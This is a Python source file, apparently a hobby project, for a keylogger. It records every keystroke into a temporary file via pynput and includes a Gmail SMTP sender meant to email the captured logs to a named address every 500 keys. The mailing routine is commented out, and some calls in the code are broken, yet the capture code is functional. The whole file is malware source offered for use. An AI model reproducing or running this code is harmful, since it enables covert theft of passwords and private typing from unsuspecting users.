#!/usr/bin/python
# Author: ablil
# Description: keylogger with the option to send email
import os
import smtplib
import tempfile
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from pynput import keyboard


class GmailSender:
    def __init__(self, email="sender-email", password="sender-password"):
        self.email = email
        self.password = password

        self.conn = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        self.conn.ehlo()
        self.conn.login(self.email, self.password)

    def send(self, receiver, subject, body="", attachments=[]):
        # setup msg
        msg = MIMEMultipart()
        msg["From"] = self.email
        msg["To"] = receiver
        msg["Subject"] = subject
        msg.attach(MIMEText(body, "plain"))

        # attach files
        for f in attachments:
            with open(f, "rb") as fil:
                buff = fil.read()
                name = os.path.basename(f)
                part = MIMEApplication(buff, name)
            part["Content-Disposition"] = 'attachment; filename="{}"'.format(
                os.path.basename(f))
            msg.attach(part)

        # send
        self.conn.sendmail(self.email, receiver, msg.as_string())
        self.conn.quit()
        print("Keylogger report sent")


class Keylogger:
    def __init__(self):
        self.keylogs = os.path.join(tempfile.gettempdir(), "keylogs.logs")
        self.keylogsfile = open(self.keylogs, "a+")
        self.counter = 0

    def callback(self, key):
        self.counter += 1
        try:
            self.keylogsfile.write(str(key.char))
        except AttributeError:
            special_key = str(key)
            if special_key == "Key.enter":
                special_key = "\n"
            if special_key == "Key.space":
                special_key = " "
            self.keylogsfile.write(special_key.upper())

        # send caputered key
        if self.counter % 500 == 0:
            self.send_captured()

    def run(self):
        # sender = GmailSender()
        # sender.send('receiver-email', 'keylogger started', 'host machine: {}'.format(os.getlogin()))
        with keyboard.Listener(on_press=self.callback) as listener:
            listener.join()

    def stop(self):
        self.keylogsfile.close()

    # def send_captured(self):
    #     sender = GmailSender()
    #     self.keylogsfile.seek(0)
    #     captured = str(self.keylogsfile.read())
    #     sender.send('ablil@pm.me', 'keylogger report', captured)
    #     self.keylogger.truncate(0)


if __name__ == "__main__":
    keylogger = Keylogger()
    try:
        keylogger.run()
    except KeyboardInterrupt:
        keylogger.stop()
